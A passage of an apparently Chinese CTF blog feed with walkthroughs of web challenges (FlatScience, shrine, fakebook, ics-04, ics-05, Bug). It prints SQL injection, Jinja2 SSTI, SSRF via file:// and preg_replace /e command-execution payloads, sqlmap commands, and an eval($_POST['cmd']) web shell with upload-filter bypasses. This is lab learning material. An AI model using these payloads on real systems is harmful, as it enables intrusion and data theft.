changes</span><br><span class="line">Bazaar&#x2F;bzr</span><br><span class="line">&#x2F;&#x2F;查看所有的改变的命令，转到download的目录</span><br></pre></td></tr></table></figure><p>工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dvcs-ripper</span><br><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x01：-hg源码泄漏&quot;&gt;&lt;a href=&quot;#0x01：-hg源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;0x01：.hg源码泄漏 &quot;&gt;&lt;/a&gt;&lt;strong&gt;0x01：.hg源码泄漏&lt;/strong&gt;
    
    </summary>
    
    
    
      <category term="敏感信息" scheme="http://yoursite.com/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF/"/>
    
  </entry>
  
  <entry>
    <title>攻防daliy</title>
    <link href="http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/"/>
    <id>http://yoursite.com/2020/03/11/%E6%94%BB%E9%98%B2daliy/</id>
    <published>2020-03-11T10:22:54.000Z</published>
    <updated>2020-03-19T14:34:44.325Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0X01-FlatScience-20-03-11"><a href="#0X01-FlatScience-20-03-11" class="headerlink" title="0X01: FlatScience 20-03-11"></a>0X01: FlatScience 20-03-11<a id="more"></a></h4><p>拿到网页，正常操作scan扫一发</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/1.png" class="" title="examplename"><p>访问login.php页面，查看网页源码，有提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- <span class="doctag">TODO:</span> Remove ?debug-Parameter! --&gt;</span></span><br></pre></td></tr></table></figure><p>重新访问login.php?debug,拿到了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'usr'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'pw'</span>]))&#123;</span><br><span class="line">        $user = $_POST[<span class="string">'usr'</span>];</span><br><span class="line">        $pass = $_POST[<span class="string">'pw'</span>];</span><br><span class="line"></span><br><span class="line">        $db = <span class="keyword">new</span> SQLite3(<span class="string">'../fancy.db'</span>);</span><br><span class="line">        </span><br><span class="line">        $res = $db-&gt;query(<span class="string">"SELECT id,name from Users where name='"</span>.$user.<span class="string">"' and password='"</span>.sha1($pass.<span class="string">"Salz!"</span>).<span class="string">"'"</span>);</span><br><span class="line">    <span class="keyword">if</span>($res)&#123;</span><br><span class="line">        $row = $res-&gt;fetchArray();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;Some Error occourred!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($row[<span class="string">'id'</span>]))&#123;</span><br><span class="line">            setcookie(<span class="string">'name'</span>,<span class="string">' '</span>.$row[<span class="string">'name'</span>], time() + <span class="number">60</span>, <span class="string">'/'</span>);</span><br><span class="line">            header(<span class="string">"Location: /"</span>);</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'debug'</span>]))</span><br><span class="line">highlight_file(<span class="string">'login.php'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到是SQLite3，查找资料知道sqlite自带的结构表sqlite_master，sql是sqlite_master中的一个字段，注入时经常用到的</p><p>下面就是用sql进行对数据库的查询</p><p><code>usr=1&#39; union select name,sql from sqlite_master--+&amp;pw=</code></p><p>可以得到set-cookie:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="keyword">Users</span>(</span><br><span class="line"><span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span>,</span><br><span class="line"><span class="keyword">name</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line"><span class="keyword">password</span> <span class="built_in">varchar</span>(<span class="number">255</span>),</span><br><span class="line">hint <span class="built_in">varchar</span>(<span class="number">255</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>下面就是分别查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">`usr=1' union <span class="keyword">select</span> <span class="keyword">id</span>,<span class="keyword">name</span> <span class="keyword">from</span> <span class="keyword">Users</span><span class="comment">--+&amp;pw=`  ----name=+admin</span></span><br><span class="line"><span class="string">`usr=1' union select id,password from Users--+&amp;pw=`</span> <span class="comment">----name=+3fab54a50e770d830c0416df817567662a9dc85c;</span></span><br><span class="line"><span class="string">`usr=1' union select id,hint from Users--+&amp;pw=`</span><span class="comment">----name=+my+fav+word+in+my+fav+paper%3F%21;</span></span><br></pre></td></tr></table></figure><p>结合上面的源码以及给出的hint，password=str(unknown).”Salz!”,应该要用已知的密码在题目给出的文档中找出加密后相同的那段字符串，也就是进行碰撞，下面给出大佬的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> cStringIO <span class="keyword">import</span> StringIO</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfinterp <span class="keyword">import</span> PDFResourceManager, PDFPageInterpreter</span><br><span class="line"><span class="keyword">from</span> pdfminer.converter <span class="keyword">import</span> TextConverter</span><br><span class="line"><span class="keyword">from</span> pdfminer.layout <span class="keyword">import</span> LAParams</span><br><span class="line"><span class="keyword">from</span> pdfminer.pdfpage <span class="keyword">import</span> PDFPage</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pdf</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> [i <span class="keyword">for</span> i <span class="keyword">in</span> os.listdir(<span class="string">"./"</span>) <span class="keyword">if</span> i.endswith(<span class="string">"pdf"</span>)]</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert_pdf_2_text</span><span class="params">(path)</span>:</span></span><br><span class="line">    rsrcmgr = PDFResourceManager()</span><br><span class="line">    retstr = StringIO()</span><br><span class="line">    device = TextConverter(rsrcmgr, retstr, codec=<span class="string">'utf-8'</span>, laparams=LAParams())</span><br><span class="line">    interpreter = PDFPageInterpreter(rsrcmgr, device)</span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">'rb'</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="keyword">for</span> page <span class="keyword">in</span> PDFPage.get_pages(fp, set()):</span><br><span class="line">            interpreter.process_page(page)</span><br><span class="line">        text = retstr.getvalue()</span><br><span class="line">    device.close()</span><br><span class="line">    retstr.close()</span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_password</span><span class="params">()</span>:</span></span><br><span class="line">pdf_path = get_pdf()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pdf_path:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Searching word in "</span> + i</span><br><span class="line">pdf_text = convert_pdf_2_text(i).split(<span class="string">" "</span>)</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> pdf_text:</span><br><span class="line">sha1_password = hashlib.sha1(word+<span class="string">"Salz!"</span>).hexdigest()</span><br><span class="line"><span class="keyword">if</span> sha1_password == <span class="string">'3fab54a50e770d830c0416df817567662a9dc85c'</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">"Find the password :"</span> + word</span><br><span class="line">exit()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">find_password()</span><br></pre></td></tr></table></figure><p>跑出的密码为ThinJerboa，在admin.php页面登录就可以拿到flag</p><p>（还有一种方法是这段密码刚好可以进行md5解密，去掉题目给出的那部分刚好是ThinJerboa）</p><h4 id="0X02-shrine-20-03-12"><a href="#0X02-shrine-20-03-12" class="headerlink" title="0X02:shrine 20-03-12"></a>0X02:shrine 20-03-12</h4><p>打开网页，整理一下给出的python代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>审一下，发现’()’会被替换为空，在blacklist中的会被置为None，提交的参数在/shrine/的路径下</p><p>下面来进行一下测试</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/2.png" class="" title="examplename"><p>通过查阅SSTI模板引擎注入图可以知道应该是jinja2+flask</p><p>由于这里的变量config被禁用，暂时没想到什么办法，看了其他师傅的wp，知道了要用python的沙箱逃逸方法，查了有关flask的内置函数，以下是资料</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br></pre></td></tr></table></figure><p>下面用get_flashed_messages()的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_flashed_messages.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/3.png" class="" title="examplename"><p>可以找到current_app,继续注入当前app的config</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:&#123;&#123;get_fiashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以找到flag，这里就不贴了</p><h4 id="0X03-fakebook-20-03-13"><a href="#0X03-fakebook-20-03-13" class="headerlink" title="0X03:fakebook 20-03-13"></a>0X03:fakebook 20-03-13</h4><p>拿到题目，scan冲一发</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/4.png" class="" title="examplename"><p>发现有robots.txt，访问，下载源码user.php.bak</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>审阅源码发现get()可能存在ssrf服务端楼的那个，join一个账号,点username页面跳转，发现一个注入点</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.198.29.45:44796/view.php?no=1</span><br></pre></td></tr></table></figure><p>下面开始注入测试：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">no=1 order by 5<span class="comment">#//报错，说明没有五个字段，并且爆出了路径在 /var/www/html/db.php下</span></span><br><span class="line">no=1 order by 5<span class="comment">#//正常回显，说明是4个字段，下面开始爆库</span></span><br></pre></td></tr></table></figure><p>这里有一个注意的地方就是,经过多次测试发现union 和select不能同时使用，用注释/**/进行绕过</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">no = -1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(schema_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.schemata<span class="comment">#//爆出fakebook库</span></span><br><span class="line"><span class="keyword">no</span>= <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'fakebook'</span><span class="comment">#//爆出users表</span></span><br><span class="line"><span class="keyword">no</span> = <span class="number">-1</span> <span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span><span class="comment">#爆出no,username,passwd,data字段</span></span><br><span class="line">下面可以一个个查询信息，可以看到<span class="keyword">data</span>中的数据进行了序列化</span><br><span class="line">O:8:"UserInfo":3&#123;s:4:"name";s:7:"hjfashd";s:3:"age";i:1123;s:4:"blog";s:13:"www.baidu.com";&#125;</span><br></pre></td></tr></table></figure><p>在目录扫描中可以看到存在flag.php，可以把blog改为/var/www/html/flag.php路径就可以拿到flag了,这里还要注意用file：//协议来读取,此外data在第四个字段，所以这里查询时也要放在第四位</p><p>到这里，我们就可以根据已知的信息来构造payload</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:no=-1 union<span class="comment">/**/</span><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="string">'O:8:"UserInfo":3:&#123;s:4:"name";s:3:"ggg";s:3:"age";i:12356;s:4:"blog";s:29:"file:///var/www/html/flag.php";&#125;'</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>查看网页源码，可以看到</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">src='data:text/html;base64,PD9waHANCg0KJGZsYWcgPSAiZmxhZ3tjMWU1NTJmZGY3NzA0OWZhYmY2NTE2OGYyMmY3YWVhYn0iOw0KZXhpdCgwKTsNCg=='&gt;//base64解码就可以了</span><br></pre></td></tr></table></figure><h4 id="0X04ics-04-20-03-14"><a href="#0X04ics-04-20-03-14" class="headerlink" title="0X04ics-04 20-03-14"></a>0X04ics-04 20-03-14</h4><p>根据题目描述，在注册和登录页面存在漏洞，注册一个账号登录，提示说普通用户登录成功但没什么用，看来是要拿到管理员的账号，这里有个忘记密码的页面，但好像暂时没什么用</p><p>上工具，用sqlmap进行尝试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; --dbs&#x2F;&#x2F;爆出了四个库，经过尝试发现所要的数据在cetc004中</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 --tables&#x2F;&#x2F;爆出user表</span><br><span class="line">sqlmap.py -u &quot;http:&#x2F;&#x2F;111.198.29.45:51961&#x2F;findpwd.php&quot; --data&#x3D;&quot;username&#x3D;a&quot; -D cetc004 -T user --columns&#x2F;&#x2F;爆出四个字段，answer，question，password，username</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/5.png" class="" title="examplename"><p>可以看到已经存在的账户信息，密码被加密了，未找到解密方法，回到注册和登录页面</p><p>经过测试发现注册页面相同的账户名可以注册多次，登录界面同账户不同密码都可以成功登录</p><p>注册一个名为c3tlwDmIn23的新账户登录就能拿到flag</p><h4 id="0X05ics-05-20-03-14"><a href="#0X05ics-05-20-03-14" class="headerlink" title="0X05ics-05 20-03-14"></a>0X05ics-05 20-03-14</h4><p>拿到题目在<code>http://111.198.29.45:59907/index.php?page=1</code>发现注入点，看到到变量传参，有可能存在文件包含漏洞读取源码，又是php站，想到使用php伪协议读取源码</p><p><code>http://111.198.29.45:59907/index.php?page=php://filter/read=convert.base64-encode/resource=index.php</code></p><p>base64解密，整理一下源码，这里就只附上重点部分</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到首先是一个判断，也就是访问是否来自本机，用X-Forwarded-For进行伪造即可</p><p>再来分析一下主题部分，通过get传入pattern、replacement、subject三个参数的值，通过preg_replace()函数，在subject找指定的pattern部分用replacement来进行替代</p><p>通过查找资料了解了preg_replace函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">reg_replace 函数执行一个正则表达式的搜索和替换</span><br><span class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit &#x3D; -1 [, int &amp;$count ]] )</span><br><span class="line">搜索 subject 中匹配 pattern 的部分， 以 replacement 进行替换。</span><br><span class="line">• $pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">• $replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">• $subject: 要搜索替换的目标字符串或字符串数组。</span><br><span class="line">• $limit: 可选，对于每个模式用于每个 subject 字符串的最大可替换次数。 默认是-1（无限制）。</span><br><span class="line">• $count: 可选，为替换执行的次数。</span><br><span class="line">这个函数有个漏洞</span><br><span class="line">当$pattern使用了&#x2F;e修正符，替换的时候会把$replacement替换进去的代码当成php代码执行，当然要构成合法的php代码才能正确执行。</span><br></pre></td></tr></table></figure><p>思路出来了，用burp抓包</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/6.png" class="" title="examplename"><p>可以看到页面成功回显了</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/7.png" class="" title="examplename"><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/8.png" class="" title="examplename"><p>下面一步需要注意，由于这里对空格进行了处理，可以用+或者%20来替代，“&amp;”用%26替代</p><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir%26%26+ls&quot;)&amp;&amp;sub=test</code></p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/9.png" class="" title="examplename"><p><code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cd+s3chahahaDir/flag%26%26+ls&quot;)&amp;&amp;sub=test</code></p><p>找到了flag.php文件，这里就不贴图了</p><p>最后用cat来读取<code>index.php?pat=/test/e&amp;&amp;rep=system(&quot;cat+s3chahahaDir/flag/flag.php&quot;)&amp;&amp;sub=test</code></p><h4 id="0X06Bug-20-03-15"><a href="#0X06Bug-20-03-15" class="headerlink" title="0X06Bug  20-03-15"></a>0X06Bug  20-03-15</h4><p>打开题目场景是一个登录界面，有注册和修改密码的选项，先注册一个账号登录上去看看</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/10.png" class="" title="examplename"><p>点击manage选项，无法打开，有弹窗提示：You are not admin,很明显需要管理员账号登录，但是注册时显示账号已存在，看来关键点在修改密码的页面，抓包，成功将user改成admin，再次登录，点击manage，提示Ip not Allowed,抓包，加上X-Forwarded-For:127.0.0.1,成功打开，没什么提示，查看网页源码，发现信息</p><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/11.png" class="" title="examplename"><p>根据提示传入参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;111.198.29.45:39291&#x2F;index.php?module&#x3D;filemanage&amp;do&#x3D;1&#x2F;&#x2F;提示action is not correct</span><br><span class="line">尝试将do改成download，read，write，upload，最后发现时upload</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/12.png" class="" title="examplename"><p>接下来就是上传文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">在测试中发现有&lt;?php会报错，这就想到用php的脚本模式</span><br><span class="line">构造内容:</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;@eval($_POST[&quot;cmd&quot;])&lt;&#x2F;script&gt;以php后缀上传，burp抓包</span><br></pre></td></tr></table></figure><img src="/2020/03/11/%E6%94%BB%E9%98%B2daliy/13.png" class="" title="examplename"><p>根据提示尝试后缀名的绕过，在过程中发现对Content-Type有进行检测，将其改为image/jpeg，后缀名在已知的绕过方法中最后发现php4|php5可以，成功拿到flag</p><h4 id="0X07ics-07-20-03-18"><a href="#0X07ics-07-20-03-18" class="headerlink" title="0X07ics-07 